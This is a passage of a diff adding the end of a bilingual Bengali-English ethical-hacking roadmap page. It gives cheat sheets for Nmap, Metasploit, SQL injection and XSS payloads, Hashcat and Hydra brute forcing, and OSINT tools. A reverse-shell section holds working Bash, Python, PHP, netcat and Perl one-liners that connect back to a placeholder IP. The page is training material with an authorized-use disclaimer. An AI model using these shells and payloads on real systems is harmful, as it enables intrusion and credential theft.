+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec">🗺️ Nmap Cheat Sheet</h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-header" style="background:var(--accent);"><span class="bn-text">স্ক্যান টাইপ</span><span class="en-text">Scan Types</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">nmap -sS TARGET</span><span class="cheat-desc"><span class="bn-text">SYN Stealth</span><span class="en-text">SYN Stealth</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">nmap -sV TARGET</span><span class="cheat-desc"><span class="bn-text">Version detect</span><span class="en-text">Version detect</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">nmap -A TARGET</span><span class="cheat-desc"><span class="bn-text">Aggressive scan</span><span class="en-text">Aggressive scan</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">nmap -p- TARGET</span><span class="cheat-desc"><span class="bn-text">All 65535 ports</span><span class="en-text">All 65535 ports</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">nmap -O TARGET</span><span class="cheat-desc"><span class="bn-text">OS detection</span><span class="en-text">OS detection</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">nmap -sU TARGET</span><span class="cheat-desc"><span class="bn-text">UDP scan</span><span class="en-text">UDP scan</span></span></div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-header" style="background:var(--accent2);">NSE Scripts</div>
+        <div class="cheat-row"><span class="cheat-cmd">--script vuln</span><span class="cheat-desc"><span class="bn-text">Vulnerability check</span><span class="en-text">Vulnerability check</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">--script http-enum</span><span class="cheat-desc"><span class="bn-text">Web enumeration</span><span class="en-text">Web enumeration</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">--script smb-vuln-*</span><span class="cheat-desc"><span class="bn-text">SMB vulnerabilities</span><span class="en-text">SMB vulnerabilities</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">--script ftp-anon</span><span class="cheat-desc"><span class="bn-text">Anonymous FTP</span><span class="en-text">Anonymous FTP</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">--script ssh-brute</span><span class="cheat-desc"><span class="bn-text">SSH brute force</span><span class="en-text">SSH brute force</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">--script dns-zone-transfer</span><span class="cheat-desc"><span class="bn-text">Zone transfer</span><span class="en-text">Zone transfer</span></span></div>
+      </div>
+    </div>
+
+    <h2 class="sec">🐉 Metasploit Cheat Sheet</h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-header" style="background:var(--accent3);">MSF Console</div>
+        <div class="cheat-row"><span class="cheat-cmd">search [keyword]</span><span class="cheat-desc"><span class="bn-text">Module খোঁজা</span><span class="en-text">Search module</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">use [module]</span><span class="cheat-desc"><span class="bn-text">Module লোড</span><span class="en-text">Load module</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">show options</span><span class="cheat-desc"><span class="bn-text">Options দেখো</span><span class="en-text">View options</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">set RHOSTS [IP]</span><span class="cheat-desc"><span class="bn-text">Target set করো</span><span class="en-text">Set target</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">run / exploit</span><span class="cheat-desc"><span class="bn-text">Exploit চালাও</span><span class="en-text">Run exploit</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">sessions -l</span><span class="cheat-desc"><span class="bn-text">Session list</span><span class="en-text">List sessions</span></span></div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-header" style="background:var(--accent5);">Meterpreter</div>
+        <div class="cheat-row"><span class="cheat-cmd">sysinfo</span><span class="cheat-desc"><span class="bn-text">System info</span><span class="en-text">System info</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">getuid</span><span class="cheat-desc"><span class="bn-text">Current user</span><span class="en-text">Current user</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">getsystem</span><span class="cheat-desc"><span class="bn-text">Privilege escalate</span><span class="en-text">Privilege escalate</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">hashdump</span><span class="cheat-desc"><span class="bn-text">Password hashes</span><span class="en-text">Password hashes</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">shell</span><span class="cheat-desc"><span class="bn-text">System shell</span><span class="en-text">System shell</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">run post/multi/recon/...</span><span class="cheat-desc"><span class="bn-text">Post module</span><span class="en-text">Post module</span></span></div>
+      </div>
+    </div>
+
+    <h2 class="sec">🌐 Web Hacking Cheat Sheet</h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-header" style="background:#b45309;">SQL Injection</div>
+        <div class="cheat-row"><span class="cheat-cmd">' OR '1'='1'--</span><span class="cheat-desc"><span class="bn-text">Auth bypass</span><span class="en-text">Auth bypass</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">sqlmap -u "URL?id=1"</span><span class="cheat-desc"><span class="bn-text">Auto SQLi</span><span class="en-text">Auto SQLi</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">sqlmap -u URL --dbs</span><span class="cheat-desc"><span class="bn-text">Database list</span><span class="en-text">Database list</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">sqlmap -r req.txt</span><span class="cheat-desc"><span class="bn-text">Request file</span><span class="en-text">Request file</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">UNION SELECT 1,2,3--</span><span class="cheat-desc"><span class="bn-text">Column count</span><span class="en-text">Column count</span></span></div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-header" style="background:#7c3aed;">XSS Payloads</div>
+        <div class="cheat-row"><span class="cheat-cmd">&lt;script&gt;alert(1)&lt;/script&gt;</span><span class="cheat-desc"><span class="bn-text">Basic XSS</span><span class="en-text">Basic XSS</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">&lt;img src=x onerror=alert(1)&gt;</span><span class="cheat-desc"><span class="bn-text">Img tag XSS</span><span class="en-text">Img tag XSS</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">&lt;svg onload=alert(1)&gt;</span><span class="cheat-desc"><span class="bn-text">SVG XSS</span><span class="en-text">SVG XSS</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">document.cookie</span><span class="cheat-desc"><span class="bn-text">Cookie steal</span><span class="en-text">Cookie steal</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">dalfox url http://target</span><span class="cheat-desc"><span class="bn-text">Auto XSS scan</span><span class="en-text">Auto XSS scan</span></span></div>
+      </div>
+    </div>
+
+    <h2 class="sec">🔑 Password Cracking Cheat Sheet</h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-header" style="background:#dc2626;">Hashcat</div>
+        <div class="cheat-row"><span class="cheat-cmd">hashcat -m 0</span><span class="cheat-desc">MD5</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">hashcat -m 100</span><span class="cheat-desc">SHA1</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">hashcat -m 1000</span><span class="cheat-desc">NTLM</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">hashcat -m 1800</span><span class="cheat-desc">sha512crypt</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">hashcat -a 0</span><span class="cheat-desc"><span class="bn-text">Dictionary</span><span class="en-text">Dictionary</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">hashcat -a 3 ?l?l?l?l</span><span class="cheat-desc"><span class="bn-text">Brute force</span><span class="en-text">Brute force</span></span></div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-header" style="background:#059669;">Hydra</div>
+        <div class="cheat-row"><span class="cheat-cmd">hydra -l USER -P list ssh://IP</span><span class="cheat-desc">SSH</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">hydra -l USER -P list ftp://IP</span><span class="cheat-desc">FTP</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">hydra -l USER -P list rdp://IP</span><span class="cheat-desc">RDP</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">hydra -L users -P list smb://IP</span><span class="cheat-desc">SMB</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">-t 4</span><span class="cheat-desc"><span class="bn-text">4 threads</span><span class="en-text">4 threads</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">-f</span><span class="cheat-desc"><span class="bn-text">Stop on first hit</span><span class="en-text">Stop on first hit</span></span></div>
+      </div>
+    </div>
+
+    <h2 class="sec">🐚 Reverse Shell Cheat Sheet</h2>
+    <div class="code">
+<span class="c"># Listener</span>
+<span class="p">$</span> nc -lvnp 4444
+
+<span class="c">## Reverse Shells ##</span>
+<span class="y">Bash:</span>     bash -i >& /dev/tcp/IP/4444 0>&1
+<span class="y">Python:</span>   python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+<span class="y">PHP:</span>      php -r '$s=fsockopen("IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+<span class="y">NC:</span>       nc -e /bin/sh IP 4444
+<span class="y">Perl:</span>     perl -e 'use Socket;$i="IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
+
+<span class="c">## Upgrade Shell ##</span>
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+Ctrl+Z → stty raw -echo; fg → export TERM=xterm
+    </div>
+
+    <h2 class="sec">🔍 OSINT & Recon Cheat Sheet</h2>
+    <div class="cheat-grid">
+      <div class="cheat-card">
+        <div class="cheat-header" style="background:#0369a1;"><span class="bn-text">DNS & Subdomain</span><span class="en-text">DNS & Subdomain</span></div>
+        <div class="cheat-row"><span class="cheat-cmd">amass enum -d domain</span><span class="cheat-desc"><span class="bn-text">Subdomain enum</span><span class="en-text">Subdomain enum</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">sublist3r -d domain</span><span class="cheat-desc"><span class="bn-text">Subdomain list</span><span class="en-text">Subdomain list</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">dig domain ANY</span><span class="cheat-desc"><span class="bn-text">DNS records</span><span class="en-text">DNS records</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">whois domain</span><span class="cheat-desc"><span class="bn-text">Domain info</span><span class="en-text">Domain info</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">theHarvester -d domain -b all</span><span class="cheat-desc"><span class="bn-text">Email harvest</span><span class="en-text">Email harvest</span></span></div>
+      </div>
+      <div class="cheat-card">
+        <div class="cheat-header" style="background:#0d9488;">Web Enumeration</div>
+        <div class="cheat-row"><span class="cheat-cmd">gobuster dir -u URL -w list</span><span class="cheat-desc"><span class="bn-text">Directory brute</span><span class="en-text">Directory brute</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">ffuf -w list -u URL/FUZZ</span><span class="cheat-desc"><span class="bn-text">Fast fuzzing</span><span class="en-text">Fast fuzzing</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">nikto -h URL</span><span class="cheat-desc"><span class="bn-text">Web vuln scan</span><span class="en-text">Web vuln scan</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">whatweb URL</span><span class="cheat-desc"><span class="bn-text">Tech detection</span><span class="en-text">Tech detection</span></span></div>
+        <div class="cheat-row"><span class="cheat-cmd">wafw00f URL</span><span class="cheat-desc"><span class="bn-text">WAF detection</span><span class="en-text">WAF detection</span></span></div>
+      </div>
+    </div>
+
+    <h2 class="sec">🏆 <span class="bn-text">Practice Platforms</span><span class="en-text">Practice Platforms</span></h2>
+    <div class="tool-grid">
+      <div class="tool-card">
+        <div class="tool-name">TryHackMe</div>
+        <div class="tool-cat" style="color:var(--accent);">BEGINNER FRIENDLY</div>
+        <div class="tool-desc"><span class="bn-text">Guided learning path, শুরুর জন্য সেরা। tryhackme.com</span><span class="en-text">Guided learning path, best for beginners. tryhackme.com</span></div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-name">HackTheBox</div>
+        <div class="tool-cat" style="color:var(--accent4);">INTERMEDIATE</div>
+        <div class="tool-desc"><span class="bn-text">Real-world machines, CTF-style challenge. hackthebox.com</span><span class="en-text">Real-world machines, CTF-style challenge. hackthebox.com</span></div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-name">VulnHub</div>
+        <div class="tool-cat" style="color:var(--accent2);">OFFLINE</div>
+        <div class="tool-desc"><span class="bn-text">Vulnerable VM download করে locally practice। vulnhub.com</span><span class="en-text">Download vulnerable VMs to practice locally. vulnhub.com</span></div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-name">PortSwigger</div>
+        <div class="tool-cat" style="color:var(--accent5);">WEB SECURITY</div>
+        <div class="tool-desc"><span class="bn-text">Web security academy, free labs। portswigger.net</span><span class="en-text">Web security academy, free labs. portswigger.net</span></div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-name">PentesterLab</div>
+        <div class="tool-cat" style="color:var(--accent3);">STRUCTURED</div>
+        <div class="tool-desc"><span class="bn-text">Hands-on web app pentesting exercises</span><span class="en-text">Hands-on web app pentesting exercises</span></div>
+      </div>
+      <div class="tool-card">
+        <div class="tool-name">Bugcrowd / HackerOne</div>
+        <div class="tool-cat" style="color:var(--accent);">BUG BOUNTY</div>
+        <div class="tool-desc"><span class="bn-text">Real company-র bug খুঁজে পুরস্কার নাও</span><span class="en-text">Find bugs in real companies and earn rewards</span></div>
+      </div>
+    </div>
+
+    <div style="text-align:center; margin-top:50px; padding:30px 20px; background:linear-gradient(135deg,#000814,#001a0a); border:1px solid rgba(0,255,136,0.2); border-radius:12px;">
+      <div style="font-family:'Share Tech Mono',monospace; font-size:18px; color:var(--accent); margin-bottom:12px;">
+        "The quieter you become, the more you can hear."
+      </div>
+      <p style="color:rgba(200,230,200,0.6); font-size:13px; max-width:600px; margin:0 auto;">
+        <span class="bn-text">এই ডকুমেন্ট সম্পূর্ণ শিক্ষামূলক উদ্দেশ্যে। সবসময় authorized environment-এ এবং legal সীমার মধ্যে practice করো।</span>
+        <span class="en-text">This document is entirely for educational purposes. Always practice in an authorized environment and within legal boundaries.</span>
+      </p>
+      <p style="margin-top:12px; font-size:11px; color:rgba(0,255,136,0.5); font-family:'Share Tech Mono',monospace;">v1.0 — Ethical Hacking & Penetration Testing Roadmap | Bilingual | 12 Chapters + Cheat Sheets</p>
+    </div>
+
+  </div>
+</div>
+
+<script>
+const body = document.body;
+
+// ══ THEME TOGGLE ══
+function toggleTheme() {
+  const btn = document.getElementById('themeBtn');
+  if (body.classList.contains('dark-mode')) {
+    body.classList.replace('dark-mode', 'light-mode');
+    btn.textContent = '☀️ Light';
+    btn.style.background = '';
+    btn.style.color = '';
+    localStorage.setItem('theme', 'light');
+  } else if (body.classList.contains('light-mode')) {
+    body.classList.replace('light-mode', 'dark-mode');
+    btn.textContent = '🌙 Dark';
+    btn.style.background = '#ffd60a';
+    btn.style.color = '#000';
+    localStorage.setItem('theme', 'dark');
+  } else {
+    body.classList.add('light-mode');
+    btn.textContent = '☀️ Light';
+    localStorage.setItem('theme', 'light');
+  }
+}
+
+// ══ LANGUAGE TOGGLE ══
+function toggleLang() {
+  const btn = document.getElementById('langBtn');
+  if (body.classList.contains('lang-en')) {
+    body.classList.remove('lang-en');
+    btn.textContent = '🇬🇧 English';
+    localStorage.setItem('lang', 'bn');
+  } else {
+    body.classList.add('lang-en');
+    btn.textContent = '🇧🇩 বাংলা';
+    localStorage.setItem('lang', 'en');
+  }
+}
+
+// ══ RESTORE PREFERENCES ══
+window.addEventListener('DOMContentLoaded', () => {
+  const savedTheme = localStorage.getItem('theme');
+  const savedLang = localStorage.getItem('lang');
+  if (savedTheme === 'dark') {
+    body.classList.add('dark-mode');
+    const btn = document.getElementById('themeBtn');
+    if (btn) { btn.textContent = '🌙 Dark'; btn.style.background = '#ffd60a'; btn.style.color = '#000'; }
+  }
+  if (savedLang === 'en') {
+    body.classList.add('lang-en');
+    const btn = document.getElementById('langBtn');
+    if (btn) { btn.textContent = '🇧🇩 বাংলা'; }
+  }
+});
+</script>
+</body>
+</html>
